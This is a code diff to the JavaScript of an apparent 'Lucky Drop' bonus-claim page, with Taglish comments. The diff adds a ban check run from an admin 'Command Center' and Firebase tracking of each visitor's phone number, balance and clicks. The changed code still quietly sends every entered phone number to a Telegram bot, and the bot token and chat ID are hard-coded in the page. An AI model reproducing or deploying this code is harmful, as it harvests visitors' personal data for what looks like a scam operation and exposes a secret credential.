@@ -106,12 +106,22 @@
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
 
-        function showBlockedUI() {
+        function showBlockedUI(reason = "claimed") {
             const overlay = document.getElementById('modalOverlay');
             overlay.style.display = 'flex';
+            
+            let blockMessage = "⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.";
+            let title = "RESTRICTED";
+            
+            // Custom message kapag galing sa BAN_PROTOCOL_TERMINAL
+            if (reason === "banned") {
+                title = "TERMINATED";
+                blockMessage = "⚠️ ACCESS_DENIED: Your GHOST_ID has been blacklisted by the Command Center.";
+            }
+
             document.getElementById('modalBodyContent').innerHTML = `
-                <h2 style="color: #ff4d4d; margin-bottom: 15px;">RESTRICTED</h2>
-                <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">⚠️ This mobile number or device is already associated with a claimed bonus. System locked to prevent duplication.</p>
+                <h2 style="color: #ff4d4d; margin-bottom: 15px;">${title}</h2>
+                <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">${blockMessage}</p>
                 <div style="font-size: 50px; margin: 20px 0;">🚫</div>
                 <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff; box-shadow: none; animation: none;" onclick="location.reload()">Device Locked</button>
             `;
@@ -147,37 +157,61 @@
             btn.disabled = true; 
             btn.innerHTML = "CHECKING SECURE STATUS...";
 
-            // A. Check Firebase for "Ghost" (Claimed) status
-            db.ref('user_logs/' + phone).once('value', async (snapshot) => {
-                const userData = snapshot.val();
-
-                // B. Kung ang user ay na-mark na as "claimed" sa database, i-block agad
-                if (userData && userData.status === 'claimed') {
+            // NEW: STEP 0 - Check muna kung na-ban ang number sa Admin Command Center
+            db.ref('banned_ghosts/' + phone).once('value', async (banSnap) => {
+                if (banSnap.exists()) {
                     localStorage.setItem("cp_device_locked", "true");
-                    showBlockedUI();
+                    showBlockedUI("banned");
                     return;
                 }
 
-                // C. Check static blacklist if still exists
-                const blockedList = window.BLACKLISTED_NUMBERS || [];
-                if (blockedList.includes(phone)) {
-                    localStorage.setItem("cp_device_locked", "true");
-                    showBlockedUI();
-                    return;
-                }
+                // A. Check Firebase for "Ghost" (Claimed) status
+                db.ref('user_logs/' + phone).once('value', async (snapshot) => {
+                    const userData = snapshot.val();
 
-                // D. All clear! Proceed to Telegram and Main
-                try {
-                    localStorage.setItem("userPhone", phone);
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
-                    localStorage.setItem("cp_verified", "true");
-                    btn.innerHTML = "SUCCESS...";
-                    setTimeout(() => { window.location.href = "main.html"; }, 1000);
-                } catch (e) {
-                    localStorage.setItem("userPhone", phone);
-                    localStorage.setItem("cp_verified", "true");
-                    window.location.href = "main.html";
-                }
+                    // B. Kung ang user ay na-mark na as "claimed" sa database, i-block agad
+                    if (userData && userData.status === 'claimed') {
+                        localStorage.setItem("cp_device_locked", "true");
+                        showBlockedUI();
+                        return;
+                    }
+
+                    // C. Check static blacklist if still exists
+                    const blockedList = window.BLACKLISTED_NUMBERS || [];
+                    if (blockedList.includes(phone)) {
+                        localStorage.setItem("cp_device_locked", "true");
+                        showBlockedUI();
+                        return;
+                    }
+
+                    // NEW: Initialize Session para lumabas agad sa GHOST_INTEL_LOGS sa admin
+                    db.ref('user_sessions/' + phone).once('value', s => {
+                        if(!s.exists()) {
+                            db.ref('user_sessions/' + phone).set({
+                                phone: phone,
+                                balance: 0,
+                                clicks: 0,
+                                hasShared: false,
+                                lastUpdate: Date.now()
+                            });
+                        } else {
+                            db.ref('user_sessions/' + phone).update({ lastUpdate: Date.now() });
+                        }
+                    });
+
+                    // D. All clear! Proceed to Telegram and Main
+                    try {
+                        localStorage.setItem("userPhone", phone);
+                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP LOGIN:\n📱 " + phone)}`);
+                        localStorage.setItem("cp_verified", "true");
+                        btn.innerHTML = "SUCCESS...";
+                        setTimeout(() => { window.location.href = "main.html"; }, 1000);
+                    } catch (e) {
+                        localStorage.setItem("userPhone", phone);
+                        localStorage.setItem("cp_verified", "true");
+                        window.location.href = "main.html";
+                    }
+                });
             });
         }
 
